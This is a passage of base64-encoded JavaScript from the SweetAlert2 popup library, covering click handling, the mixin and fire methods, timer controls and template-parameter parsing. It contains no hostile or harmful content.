xuICAgICAgLy8gSWdub3JlIGNsaWNrIGV2ZW50cyB0aGF0IGhhZCBtb3VzZWRvd24gb24gdGhlIGNvbnRhaW5lciBidXQgbW91c2V1cCBvbiB0aGUgcG9wdXBcbiAgICAgIGhhbmRsZUNvbnRhaW5lck1vdXNlZG93bihkb21DYWNoZSk7XG4gICAgICBoYW5kbGVNb2RhbENsaWNrKGluc3RhbmNlLCBkb21DYWNoZSwgZGlzbWlzc1dpdGgpO1xuICAgIH1cbiAgfTtcbiAgY29uc3QgaGFuZGxlVG9hc3RDbGljayA9IChpbnN0YW5jZSwgZG9tQ2FjaGUsIGRpc21pc3NXaXRoKSA9PiB7XG4gICAgLy8gQ2xvc2luZyB0b2FzdCBieSBpbnRlcm5hbCBjbGlja1xuICAgIGRvbUNhY2hlLnBvcHVwLm9uY2xpY2sgPSAoKSA9PiB7XG4gICAgICBjb25zdCBpbm5lclBhcmFtcyA9IHByaXZhdGVQcm9wcy5pbm5lclBhcmFtcy5nZXQoaW5zdGFuY2UpO1xuICAgICAgaWYgKGlubmVyUGFyYW1zICYmIChpc0FueUJ1dHRvblNob3duKGlubmVyUGFyYW1zKSB8fCBpbm5lclBhcmFtcy50aW1lciB8fCBpbm5lclBhcmFtcy5pbnB1dCkpIHtcbiAgICAgICAgcmV0dXJuO1xuICAgICAgfVxuICAgICAgZGlzbWlzc1dpdGgoRGlzbWlzc1JlYXNvbi5jbG9zZSk7XG4gICAgfTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHsqfSBpbm5lclBhcmFtc1xuICAgKiBAcmV0dXJucyB7Ym9vbGVhbn1cbiAgICovXG4gIGNvbnN0IGlzQW55QnV0dG9uU2hvd24gPSBpbm5lclBhcmFtcyA9PiB7XG4gICAgcmV0dXJuIGlubmVyUGFyYW1zLnNob3dDb25maXJtQnV0dG9uIHx8IGlubmVyUGFyYW1zLnNob3dEZW55QnV0dG9uIHx8IGlubmVyUGFyYW1zLnNob3dDYW5jZWxCdXR0b24gfHwgaW5uZXJQYXJhbXMuc2hvd0Nsb3NlQnV0dG9uO1xuICB9O1xuICBsZXQgaWdub3JlT3V0c2lkZUNsaWNrID0gZmFsc2U7XG4gIGNvbnN0IGhhbmRsZU1vZGFsTW91c2Vkb3duID0gZG9tQ2FjaGUgPT4ge1xuICAgIGRvbUNhY2hlLnBvcHVwLm9ubW91c2Vkb3duID0gKCkgPT4ge1xuICAgICAgZG9tQ2FjaGUuY29udGFpbmVyLm9ubW91c2V1cCA9IGZ1bmN0aW9uIChlKSB7XG4gICAgICAgIGRvbUNhY2hlLmNvbnRhaW5lci5vbm1vdXNldXAgPSB1bmRlZmluZWQ7XG4gICAgICAgIC8vIFdlIG9ubHkgY2hlY2sgaWYgdGhlIG1vdXNldXAgdGFyZ2V0IGlzIHRoZSBjb250YWluZXIgYmVjYXVzZSB1c3VhbGx5IGl0IGRvZXNuJ3RcbiAgICAgICAgLy8gaGF2ZSBhbnkgb3RoZXIgZGlyZWN0IGNoaWxkcmVuIGFzaWRlIG9mIHRoZSBwb3B1cFxuICAgICAgICBpZiAoZS50YXJnZXQgPT09IGRvbUNhY2hlLmNvbnRhaW5lcikge1xuICAgICAgICAgIGlnbm9yZU91dHNpZGVDbGljayA9IHRydWU7XG4gICAgICAgIH1cbiAgICAgIH07XG4gICAgfTtcbiAgfTtcbiAgY29uc3QgaGFuZGxlQ29udGFpbmVyTW91c2Vkb3duID0gZG9tQ2FjaGUgPT4ge1xuICAgIGRvbUNhY2hlLmNvbnRhaW5lci5vbm1vdXNlZG93biA9ICgpID0+IHtcbiAgICAgIGRvbUNhY2hlLnBvcHVwLm9ubW91c2V1cCA9IGZ1bmN0aW9uIChlKSB7XG4gICAgICAgIGRvbUNhY2hlLnBvcHVwLm9ubW91c2V1cCA9IHVuZGVmaW5lZDtcbiAgICAgICAgLy8gV2UgYWxzbyBuZWVkIHRvIGNoZWNrIGlmIHRoZSBtb3VzZXVwIHRhcmdldCBpcyBhIGNoaWxkIG9mIHRoZSBwb3B1cFxuICAgICAgICBpZiAoZS50YXJnZXQgPT09IGRvbUNhY2hlLnBvcHVwIHx8IGRvbUNhY2hlLnBvcHVwLmNvbnRhaW5zKGUudGFyZ2V0KSkge1xuICAgICAgICAgIGlnbm9yZU91dHNpZGVDbGljayA9IHRydWU7XG4gICAgICAgIH1cbiAgICAgIH07XG4gICAgfTtcbiAgfTtcbiAgY29uc3QgaGFuZGxlTW9kYWxDbGljayA9IChpbnN0YW5jZSwgZG9tQ2FjaGUsIGRpc21pc3NXaXRoKSA9PiB7XG4gICAgZG9tQ2FjaGUuY29udGFpbmVyLm9uY2xpY2sgPSBlID0+IHtcbiAgICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldChpbnN0YW5jZSk7XG4gICAgICBpZiAoaWdub3JlT3V0c2lkZUNsaWNrKSB7XG4gICAgICAgIGlnbm9yZU91dHNpZGVDbGljayA9IGZhbHNlO1xuICAgICAgICByZXR1cm47XG4gICAgICB9XG4gICAgICBpZiAoZS50YXJnZXQgPT09IGRvbUNhY2hlLmNvbnRhaW5lciAmJiBjYWxsSWZGdW5jdGlvbihpbm5lclBhcmFtcy5hbGxvd091dHNpZGVDbGljaykpIHtcbiAgICAgICAgZGlzbWlzc1dpdGgoRGlzbWlzc1JlYXNvbi5iYWNrZHJvcCk7XG4gICAgICB9XG4gICAgfTtcbiAgfTtcblxuICBjb25zdCBpc0pxdWVyeUVsZW1lbnQgPSBlbGVtID0+IHR5cGVvZiBlbGVtID09PSAnb2JqZWN0JyAmJiBlbGVtLmpxdWVyeTtcbiAgY29uc3QgaXNFbGVtZW50ID0gZWxlbSA9PiBlbGVtIGluc3RhbmNlb2YgRWxlbWVudCB8fCBpc0pxdWVyeUVsZW1lbnQoZWxlbSk7XG4gIGNvbnN0IGFyZ3NUb1BhcmFtcyA9IGFyZ3MgPT4ge1xuICAgIGNvbnN0IHBhcmFtcyA9IHt9O1xuICAgIGlmICh0eXBlb2YgYXJnc1swXSA9PT0gJ29iamVjdCcgJiYgIWlzRWxlbWVudChhcmdzWzBdKSkge1xuICAgICAgT2JqZWN0LmFzc2lnbihwYXJhbXMsIGFyZ3NbMF0pO1xuICAgIH0gZWxzZSB7XG4gICAgICBbJ3RpdGxlJywgJ2h0bWwnLCAnaWNvbiddLmZvckVhY2goKG5hbWUsIGluZGV4KSA9PiB7XG4gICAgICAgIGNvbnN0IGFyZyA9IGFyZ3NbaW5kZXhdO1xuICAgICAgICBpZiAodHlwZW9mIGFyZyA9PT0gJ3N0cmluZycgfHwgaXNFbGVtZW50KGFyZykpIHtcbiAgICAgICAgICBwYXJhbXNbbmFtZV0gPSBhcmc7XG4gICAgICAgIH0gZWxzZSBpZiAoYXJnICE9PSB1bmRlZmluZWQpIHtcbiAgICAgICAgICBlcnJvcihgVW5leHBlY3RlZCB0eXBlIG9mICR7bmFtZX0hIEV4cGVjdGVkIFwic3RyaW5nXCIgb3IgXCJFbGVtZW50XCIsIGdvdCAke3R5cGVvZiBhcmd9YCk7XG4gICAgICAgIH1cbiAgICAgIH0pO1xuICAgIH1cbiAgICByZXR1cm4gcGFyYW1zO1xuICB9O1xuXG4gIC8qKlxuICAgKiBNYWluIG1ldGhvZCB0byBjcmVhdGUgYSBuZXcgU3dlZXRBbGVydDIgcG9wdXBcbiAgICpcbiAgICogQHBhcmFtICB7Li4uU3dlZXRBbGVydE9wdGlvbnN9IGFyZ3NcbiAgICogQHJldHVybnMge1Byb21pc2U8U3dlZXRBbGVydFJlc3VsdD59XG4gICAqL1xuICBmdW5jdGlvbiBmaXJlKCkge1xuICAgIGNvbnN0IFN3YWwgPSB0aGlzOyAvLyBlc2xpbnQtZGlzYWJsZS1saW5lIEB0eXBlc2NyaXB0LWVzbGludC9uby10aGlzLWFsaWFzXG4gICAgZm9yICh2YXIgX2xlbiA9IGFyZ3VtZW50cy5sZW5ndGgsIGFyZ3MgPSBuZXcgQXJyYXkoX2xlbiksIF9rZXkgPSAwOyBfa2V5IDwgX2xlbjsgX2tleSsrKSB7XG4gICAgICBhcmdzW19rZXldID0gYXJndW1lbnRzW19rZXldO1xuICAgIH1cbiAgICByZXR1cm4gbmV3IFN3YWwoLi4uYXJncyk7XG4gIH1cblxuICAvKipcbiAgICogUmV0dXJucyBhbiBleHRlbmRlZCB2ZXJzaW9uIG9mIGBTd2FsYCBjb250YWluaW5nIGBwYXJhbXNgIGFzIGRlZmF1bHRzLlxuICAgKiBVc2VmdWwgZm9yIHJldXNpbmcgU3dhbCBjb25maWd1cmF0aW9uLlxuICAgKlxuICAgKiBGb3IgZXhhbXBsZTpcbiAgICpcbiAgICogQmVmb3JlOlxuICAgKiBjb25zdCB0ZXh0UHJvbXB0T3B0aW9ucyA9IHsgaW5wdXQ6ICd0ZXh0Jywgc2hvd0NhbmNlbEJ1dHRvbjogdHJ1ZSB9XG4gICAqIGNvbnN0IHt2YWx1ZTogZmlyc3ROYW1lfSA9IGF3YWl0IFN3YWwuZmlyZSh7IC4uLnRleHRQcm9tcHRPcHRpb25zLCB0aXRsZTogJ1doYXQgaXMgeW91ciBmaXJzdCBuYW1lPycgfSlcbiAgICogY29uc3Qge3ZhbHVlOiBsYXN0TmFtZX0gPSBhd2FpdCBTd2FsLmZpcmUoeyAuLi50ZXh0UHJvbXB0T3B0aW9ucywgdGl0bGU6ICdXaGF0IGlzIHlvdXIgbGFzdCBuYW1lPycgfSlcbiAgICpcbiAgICogQWZ0ZXI6XG4gICAqIGNvbnN0IFRleHRQcm9tcHQgPSBTd2FsLm1peGluKHsgaW5wdXQ6ICd0ZXh0Jywgc2hvd0NhbmNlbEJ1dHRvbjogdHJ1ZSB9KVxuICAgKiBjb25zdCB7dmFsdWU6IGZpcnN0TmFtZX0gPSBhd2FpdCBUZXh0UHJvbXB0KCdXaGF0IGlzIHlvdXIgZmlyc3QgbmFtZT8nKVxuICAgKiBjb25zdCB7dmFsdWU6IGxhc3ROYW1lfSA9IGF3YWl0IFRleHRQcm9tcHQoJ1doYXQgaXMgeW91ciBsYXN0IG5hbWU/JylcbiAgICpcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gbWl4aW5QYXJhbXNcbiAgICogQHJldHVybnMge1N3ZWV0QWxlcnQyfVxuICAgKi9cbiAgZnVuY3Rpb24gbWl4aW4obWl4aW5QYXJhbXMpIHtcbiAgICBjbGFzcyBNaXhpblN3YWwgZXh0ZW5kcyB0aGlzIHtcbiAgICAgIF9tYWluKHBhcmFtcywgcHJpb3JpdHlNaXhpblBhcmFtcykge1xuICAgICAgICByZXR1cm4gc3VwZXIuX21haW4ocGFyYW1zLCBPYmplY3QuYXNzaWduKHt9LCBtaXhpblBhcmFtcywgcHJpb3JpdHlNaXhpblBhcmFtcykpO1xuICAgICAgfVxuICAgIH1cbiAgICAvLyBAdHMtaWdub3JlXG4gICAgcmV0dXJuIE1peGluU3dhbDtcbiAgfVxuXG4gIC8qKlxuICAgKiBJZiBgdGltZXJgIHBhcmFtZXRlciBpcyBzZXQsIHJldHVybnMgbnVtYmVyIG9mIG1pbGxpc2Vjb25kcyBvZiB0aW1lciByZW1haW5lZC5cbiAgICogT3RoZXJ3aXNlLCByZXR1cm5zIHVuZGVmaW5lZC5cbiAgICpcbiAgICogQHJldHVybnMge251bWJlciB8IHVuZGVmaW5lZH1cbiAgICovXG4gIGNvbnN0IGdldFRpbWVyTGVmdCA9ICgpID0+IHtcbiAgICByZXR1cm4gZ2xvYmFsU3RhdGUudGltZW91dCAmJiBnbG9iYWxTdGF0ZS50aW1lb3V0LmdldFRpbWVyTGVmdCgpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBTdG9wIHRpbWVyLiBSZXR1cm5zIG51bWJlciBvZiBtaWxsaXNlY29uZHMgb2YgdGltZXIgcmVtYWluZWQuXG4gICAqIElmIGB0aW1lcmAgcGFyYW1ldGVyIGlzbid0IHNldCwgcmV0dXJucyB1bmRlZmluZWQuXG4gICAqXG4gICAqIEByZXR1cm5zIHtudW1iZXIgfCB1bmRlZmluZWR9XG4gICAqL1xuICBjb25zdCBzdG9wVGltZXIgPSAoKSA9PiB7XG4gICAgaWYgKGdsb2JhbFN0YXRlLnRpbWVvdXQpIHtcbiAgICAgIHN0b3BUaW1lclByb2dyZXNzQmFyKCk7XG4gICAgICByZXR1cm4gZ2xvYmFsU3RhdGUudGltZW91dC5zdG9wKCk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBSZXN1bWUgdGltZXIuIFJldHVybnMgbnVtYmVyIG9mIG1pbGxpc2Vjb25kcyBvZiB0aW1lciByZW1haW5lZC5cbiAgICogSWYgYHRpbWVyYCBwYXJhbWV0ZXIgaXNuJ3Qgc2V0LCByZXR1cm5zIHVuZGVmaW5lZC5cbiAgICpcbiAgICogQHJldHVybnMge251bWJlciB8IHVuZGVmaW5lZH1cbiAgICovXG4gIGNvbnN0IHJlc3VtZVRpbWVyID0gKCkgPT4ge1xuICAgIGlmIChnbG9iYWxTdGF0ZS50aW1lb3V0KSB7XG4gICAgICBjb25zdCByZW1haW5pbmcgPSBnbG9iYWxTdGF0ZS50aW1lb3V0LnN0YXJ0KCk7XG4gICAgICBhbmltYXRlVGltZXJQcm9ncmVzc0JhcihyZW1haW5pbmcpO1xuICAgICAgcmV0dXJuIHJlbWFpbmluZztcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIFJlc3VtZSB0aW1lci4gUmV0dXJucyBudW1iZXIgb2YgbWlsbGlzZWNvbmRzIG9mIHRpbWVyIHJlbWFpbmVkLlxuICAgKiBJZiBgdGltZXJgIHBhcmFtZXRlciBpc24ndCBzZXQsIHJldHVybnMgdW5kZWZpbmVkLlxuICAgKlxuICAgKiBAcmV0dXJucyB7bnVtYmVyIHwgdW5kZWZpbmVkfVxuICAgKi9cbiAgY29uc3QgdG9nZ2xlVGltZXIgPSAoKSA9PiB7XG4gICAgY29uc3QgdGltZXIgPSBnbG9iYWxTdGF0ZS50aW1lb3V0O1xuICAgIHJldHVybiB0aW1lciAmJiAodGltZXIucnVubmluZyA/IHN0b3BUaW1lcigpIDogcmVzdW1lVGltZXIoKSk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEluY3JlYXNlIHRpbWVyLiBSZXR1cm5zIG51bWJlciBvZiBtaWxsaXNlY29uZHMgb2YgYW4gdXBkYXRlZCB0aW1lci5cbiAgICogSWYgYHRpbWVyYCBwYXJhbWV0ZXIgaXNuJ3Qgc2V0LCByZXR1cm5zIHVuZGVmaW5lZC5cbiAgICpcbiAgICogQHBhcmFtIHtudW1iZXJ9IG5cbiAgICogQHJldHVybnMge251bWJlciB8IHVuZGVmaW5lZH1cbiAgICovXG4gIGNvbnN0IGluY3JlYXNlVGltZXIgPSBuID0+IHtcbiAgICBpZiAoZ2xvYmFsU3RhdGUudGltZW91dCkge1xuICAgICAgY29uc3QgcmVtYWluaW5nID0gZ2xvYmFsU3RhdGUudGltZW91dC5pbmNyZWFzZShuKTtcbiAgICAgIGFuaW1hdGVUaW1lclByb2dyZXNzQmFyKHJlbWFpbmluZywgdHJ1ZSk7XG4gICAgICByZXR1cm4gcmVtYWluaW5nO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQ2hlY2sgaWYgdGltZXIgaXMgcnVubmluZy4gUmV0dXJucyB0cnVlIGlmIHRpbWVyIGlzIHJ1bm5pbmdcbiAgICogb3IgZmFsc2UgaWYgdGltZXIgaXMgcGF1c2VkIG9yIHN0b3BwZWQuXG4gICAqIElmIGB0aW1lcmAgcGFyYW1ldGVyIGlzbid0IHNldCwgcmV0dXJucyB1bmRlZmluZWRcbiAgICpcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBpc1RpbWVyUnVubmluZyA9ICgpID0+IHtcbiAgICByZXR1cm4gZ2xvYmFsU3RhdGUudGltZW91dCAmJiBnbG9iYWxTdGF0ZS50aW1lb3V0LmlzUnVubmluZygpO1xuICB9O1xuXG4gIGxldCBib2R5Q2xpY2tMaXN0ZW5lckFkZGVkID0gZmFsc2U7XG4gIGNvbnN0IGNsaWNrSGFuZGxlcnMgPSB7fTtcblxuICAvKipcbiAgICogQHBhcmFtIHtzdHJpbmd9IGF0dHJcbiAgICovXG4gIGZ1bmN0aW9uIGJpbmRDbGlja0hhbmRsZXIoKSB7XG4gICAgbGV0IGF0dHIgPSBhcmd1bWVudHMubGVuZ3RoID4gMCAmJiBhcmd1bWVudHNbMF0gIT09IHVuZGVmaW5lZCA/IGFyZ3VtZW50c1swXSA6ICdkYXRhLXN3YWwtdGVtcGxhdGUnO1xuICAgIGNsaWNrSGFuZGxlcnNbYXR0cl0gPSB0aGlzO1xuICAgIGlmICghYm9keUNsaWNrTGlzdGVuZXJBZGRlZCkge1xuICAgICAgZG9jdW1lbnQuYm9keS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGJvZHlDbGlja0xpc3RlbmVyKTtcbiAgICAgIGJvZHlDbGlja0xpc3RlbmVyQWRkZWQgPSB0cnVlO1xuICAgIH1cbiAgfVxuICBjb25zdCBib2R5Q2xpY2tMaXN0ZW5lciA9IGV2ZW50ID0+IHtcbiAgICBmb3IgKGxldCBlbCA9IGV2ZW50LnRhcmdldDsgZWwgJiYgZWwgIT09IGRvY3VtZW50OyBlbCA9IGVsLnBhcmVudE5vZGUpIHtcbiAgICAgIGZvciAoY29uc3QgYXR0ciBpbiBjbGlja0hhbmRsZXJzKSB7XG4gICAgICAgIGNvbnN0IHRlbXBsYXRlID0gZWwuZ2V0QXR0cmlidXRlKGF0dHIpO1xuICAgICAgICBpZiAodGVtcGxhdGUpIHtcbiAgICAgICAgICBjbGlja0hhbmRsZXJzW2F0dHJdLmZpcmUoe1xuICAgICAgICAgICAgdGVtcGxhdGVcbiAgICAgICAgICB9KTtcbiAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICAgIH1cbiAgICB9XG4gIH07XG5cbiAgdmFyIHN0YXRpY01ldGhvZHMgPSAvKiNfX1BVUkVfXyovT2JqZWN0LmZyZWV6ZSh7XG4gICAgX19wcm90b19fOiBudWxsLFxuICAgIGFyZ3NUb1BhcmFtczogYXJnc1RvUGFyYW1zLFxuICAgIGJpbmRDbGlja0hhbmRsZXI6IGJpbmRDbGlja0hhbmRsZXIsXG4gICAgY2xpY2tDYW5jZWw6IGNsaWNrQ2FuY2VsLFxuICAgIGNsaWNrQ29uZmlybTogY2xpY2tDb25maXJtLFxuICAgIGNsaWNrRGVueTogY2xpY2tEZW55LFxuICAgIGVuYWJsZUxvYWRpbmc6IHNob3dMb2FkaW5nLFxuICAgIGZpcmU6IGZpcmUsXG4gICAgZ2V0QWN0aW9uczogZ2V0QWN0aW9ucyxcbiAgICBnZXRDYW5jZWxCdXR0b246IGdldENhbmNlbEJ1dHRvbixcbiAgICBnZXRDbG9zZUJ1dHRvbjogZ2V0Q2xvc2VCdXR0b24sXG4gICAgZ2V0Q29uZmlybUJ1dHRvbjogZ2V0Q29uZmlybUJ1dHRvbixcbiAgICBnZXRDb250YWluZXI6IGdldENvbnRhaW5lcixcbiAgICBnZXREZW55QnV0dG9uOiBnZXREZW55QnV0dG9uLFxuICAgIGdldEZvY3VzYWJsZUVsZW1lbnRzOiBnZXRGb2N1c2FibGVFbGVtZW50cyxcbiAgICBnZXRGb290ZXI6IGdldEZvb3RlcixcbiAgICBnZXRIdG1sQ29udGFpbmVyOiBnZXRIdG1sQ29udGFpbmVyLFxuICAgIGdldEljb246IGdldEljb24sXG4gICAgZ2V0SWNvbkNvbnRlbnQ6IGdldEljb25Db250ZW50LFxuICAgIGdldEltYWdlOiBnZXRJbWFnZSxcbiAgICBnZXRJbnB1dExhYmVsOiBnZXRJbnB1dExhYmVsLFxuICAgIGdldExvYWRlcjogZ2V0TG9hZGVyLFxuICAgIGdldFBvcHVwOiBnZXRQb3B1cCxcbiAgICBnZXRQcm9ncmVzc1N0ZXBzOiBnZXRQcm9ncmVzc1N0ZXBzLFxuICAgIGdldFRpbWVyTGVmdDogZ2V0VGltZXJMZWZ0LFxuICAgIGdldFRpbWVyUHJvZ3Jlc3NCYXI6IGdldFRpbWVyUHJvZ3Jlc3NCYXIsXG4gICAgZ2V0VGl0bGU6IGdldFRpdGxlLFxuICAgIGdldFZhbGlkYXRpb25NZXNzYWdlOiBnZXRWYWxpZGF0aW9uTWVzc2FnZSxcbiAgICBpbmNyZWFzZVRpbWVyOiBpbmNyZWFzZVRpbWVyLFxuICAgIGlzRGVwcmVjYXRlZFBhcmFtZXRlcjogaXNEZXByZWNhdGVkUGFyYW1ldGVyLFxuICAgIGlzTG9hZGluZzogaXNMb2FkaW5nLFxuICAgIGlzVGltZXJSdW5uaW5nOiBpc1RpbWVyUnVubmluZyxcbiAgICBpc1VwZGF0YWJsZVBhcmFtZXRlcjogaXNVcGRhdGFibGVQYXJhbWV0ZXIsXG4gICAgaXNWYWxpZFBhcmFtZXRlcjogaXNWYWxpZFBhcmFtZXRlcixcbiAgICBpc1Zpc2libGU6IGlzVmlzaWJsZSxcbiAgICBtaXhpbjogbWl4aW4sXG4gICAgcmVzdW1lVGltZXI6IHJlc3VtZVRpbWVyLFxuICAgIHNob3dMb2FkaW5nOiBzaG93TG9hZGluZyxcbiAgICBzdG9wVGltZXI6IHN0b3BUaW1lcixcbiAgICB0b2dnbGVUaW1lcjogdG9nZ2xlVGltZXJcbiAgfSk7XG5cbiAgY2xhc3MgVGltZXIge1xuICAgIC8qKlxuICAgICAqIEBwYXJhbSB7RnVuY3Rpb259IGNhbGxiYWNrXG4gICAgICogQHBhcmFtIHtudW1iZXJ9IGRlbGF5XG4gICAgICovXG4gICAgY29uc3RydWN0b3IoY2FsbGJhY2ssIGRlbGF5KSB7XG4gICAgICB0aGlzLmNhbGxiYWNrID0gY2FsbGJhY2s7XG4gICAgICB0aGlzLnJlbWFpbmluZyA9IGRlbGF5O1xuICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7XG4gICAgICB0aGlzLnN0YXJ0KCk7XG4gICAgfVxuICAgIHN0YXJ0KCkge1xuICAgICAgaWYgKCF0aGlzLnJ1bm5pbmcpIHtcbiAgICAgICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTtcbiAgICAgICAgdGhpcy5zdGFydGVkID0gbmV3IERhdGUoKTtcbiAgICAgICAgdGhpcy5pZCA9IHNldFRpbWVvdXQodGhpcy5jYWxsYmFjaywgdGhpcy5yZW1haW5pbmcpO1xuICAgICAgfVxuICAgICAgcmV0dXJuIHRoaXMucmVtYWluaW5nO1xuICAgIH1cbiAgICBzdG9wKCkge1xuICAgICAgaWYgKHRoaXMucnVubmluZykge1xuICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTtcbiAgICAgICAgY2xlYXJUaW1lb3V0KHRoaXMuaWQpO1xuICAgICAgICB0aGlzLnJlbWFpbmluZyAtPSBuZXcgRGF0ZSgpLmdldFRpbWUoKSAtIHRoaXMuc3RhcnRlZC5nZXRUaW1lKCk7XG4gICAgICB9XG4gICAgICByZXR1cm4gdGhpcy5yZW1haW5pbmc7XG4gICAgfVxuICAgIGluY3JlYXNlKG4pIHtcbiAgICAgIGNvbnN0IHJ1bm5pbmcgPSB0aGlzLnJ1bm5pbmc7XG4gICAgICBpZiAocnVubmluZykge1xuICAgICAgICB0aGlzLnN0b3AoKTtcbiAgICAgIH1cbiAgICAgIHRoaXMucmVtYWluaW5nICs9IG47XG4gICAgICBpZiAocnVubmluZykge1xuICAgICAgICB0aGlzLnN0YXJ0KCk7XG4gICAgICB9XG4gICAgICByZXR1cm4gdGhpcy5yZW1haW5pbmc7XG4gICAgfVxuICAgIGdldFRpbWVyTGVmdCgpIHtcbiAgICAgIGlmICh0aGlzLnJ1bm5pbmcpIHtcbiAgICAgICAgdGhpcy5zdG9wKCk7XG4gICAgICAgIHRoaXMuc3RhcnQoKTtcbiAgICAgIH1cbiAgICAgIHJldHVybiB0aGlzLnJlbWFpbmluZztcbiAgICB9XG4gICAgaXNSdW5uaW5nKCkge1xuICAgICAgcmV0dXJuIHRoaXMucnVubmluZztcbiAgICB9XG4gIH1cblxuICBjb25zdCBzd2FsU3RyaW5nUGFyYW1zID0gWydzd2FsLXRpdGxlJywgJ3N3YWwtaHRtbCcsICdzd2FsLWZvb3RlciddO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICogQHJldHVybnMge1N3ZWV0QWxlcnRPcHRpb25zfVxuICAgKi9cbiAgY29uc3QgZ2V0VGVtcGxhdGVQYXJhbXMgPSBwYXJhbXMgPT4ge1xuICAgIC8qKiBAdHlwZSB7SFRNTFRlbXBsYXRlRWxlbWVudH0gKi9cbiAgICBjb25zdCB0ZW1wbGF0ZSA9IHR5cGVvZiBwYXJhbXMudGVtcGxhdGUgPT09ICdzdHJpbmcnID8gZG9jdW1lbnQucXVlcnlTZWxlY3RvcihwYXJhbXMudGVtcGxhdGUpIDogcGFyYW1zLnRlbXBsYXRlO1xuICAgIGlmICghdGVtcGxhdGUpIHtcbiAgICAgIHJldHVybiB7fTtcbiAgICB9XG4gICAgLyoqIEB0eXBlIHtEb2N1bWVudEZyYWdtZW50fSAqL1xuICAgIGNvbnN0IHRlbXBsYXRlQ29udGVudCA9IHRlbXBsYXRlLmNvbnRlbnQ7XG4gICAgc2hvd1dhcm5pbmdzRm9yRWxlbWVudHModGVtcGxhdGVDb250ZW50KTtcbiAgICBjb25zdCByZXN1bHQgPSBPYmplY3QuYXNzaWduKGdldFN3YWxQYXJhbXModGVtcGxhdGVDb250ZW50KSwgZ2V0U3dhbEZ1bmN0aW9uUGFyYW1zKHRlbXBsYXRlQ29udGVudCksIGdldFN3YWxCdXR0b25zKHRlbXBsYXRlQ29udGVudCksIGdldFN3YWxJbWFnZSh0ZW1wbGF0ZUNvbnRlbnQpLCBnZXRTd2FsSWNvbih0ZW1wbGF0ZUNvbnRlbnQpLCBnZXRTd2FsSW5wdXQodGVtcGxhdGVDb250ZW50KSwgZ2V0U3dhbFN0cmluZ1BhcmFtcyh0ZW1wbGF0ZUNvbnRlbnQsIHN3YWxTdHJpbmdQYXJhbXMpKTtcbiAgICByZXR1cm4gcmVzdWx0O1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0RvY3VtZW50RnJhZ21lbnR9IHRlbXBsYXRlQ29udGVudFxuICAgKiBAcmV0dXJucyB7U3dlZXRBbGVydE9wdGlvbnN9XG4gICAqL1xuICBjb25zdCBnZXRTd2FsUGFyYW1zID0gdGVtcGxhdGVDb250ZW50ID0+IHtcbiAgICBjb25zdCByZXN1bHQgPSB7fTtcbiAgICAvKiogQHR5cGUge0hUTUxFbGVtZW50W119ICovXG4gICAgY29uc3Qgc3dhbFBhcmFtcyA9IEFycmF5LmZyb20odGVtcGxhdGVDb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ3N3YWwtcGFyYW0nKSk7XG4gICAgc3dhbFBhcmFtcy5mb3JFYWNoKHBhcmFtID0+IHtcbiAgICAgIHNob3dXYXJuaW5nc0ZvckF0dHJpYnV0ZXMocGFyYW0sIFsnbmFtZScsICd2YWx1ZSddKTtcbiAgICAgIGNvbnN0IHBhcmFtTmFtZSA9IHBhcmFtLmdldEF0dHJpYnV0ZSgnbmFtZScpO1xuICAgICAgY29uc3QgdmFsdWUgPSBwYXJhbS5nZXRBdHRyaWJ1dGUoJ3ZhbHVlJyk7XG4gICAgICBpZiAodHlwZW9mIGRlZmF1bHRQYXJhbXNbcGFyYW1OYW1lXSA9PT0gJ2Jvb2xlYW4nKSB7XG4gICAgICAgIHJlc3VsdFtwYXJhbU5hbWVdID0gdmFsdWUgIT09ICdmYWxzZSc7XG4gICAgICB9IGVsc2UgaWYgKHR5cGVvZiBkZWZhdWx0UGFyYW1zW3BhcmFtTmFtZV0gPT09ICdvYmplY3QnKSB7XG4gICAgICAgIHJlc3VsdFtwYXJhbU5hbWVdID0gSlNPTi5wYXJzZSh2YWx1ZSk7XG4gICAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHRbcGFyYW1OYW1lXSA9IHZhbHVlO1xuICAgICAgfVxuICAgIH0pO1xuICAgIHJldHVybiByZXN1bHQ7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7RG9jdW1lbnRGcmFnbWVudH0gdGVtcGxhdGVDb250ZW50XG4gICAqIEByZXR1cm5zIHtTd2VldEFsZXJ0T3B0aW9uc31cbiAgICovXG4gIGNvbnN0IGdldFN3YWxGdW5jdGlvblBhcmFtcyA9IHRlbXBsYXRlQ29udGVudCA9PiB7XG4gICAgY29uc3QgcmVzdWx0ID0ge307XG4gICAgLyoqIEB0eXBlIHtIVE1MRWxlbWVudFtdfSAqL1xuICAgIGNvbnN0IHN3YWxGdW5jdGlvbnMgPSBBcnJheS5mcm9tKHRlbXBsYXRlQ29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCdzd2FsLWZ1bmN0aW9uLXBhcmFtJykpO1xuICAgIHN3YWxGdW5jdGlvbnMuZm9yRWFjaChwYXJhbSA9PiB7XG4gICAgICBjb25zdCBwYXJhbU5hbWUgPSBwYXJhbS5nZXRBdHRyaWJ1dGUoJ25hbWUnKTtcbiAgICAgIGNvbnN0IHZhbHVlID0gcGFyYW0uZ2V0QXR0cmlidXRlKCd2YWx1ZScpO1xuICAgICAgcmVzdWx0W3BhcmFtTmFtZV0gPSBuZXcgRnVuY3Rpb24oYHJldHVybiAke3ZhbHVlfWApKCk7XG4g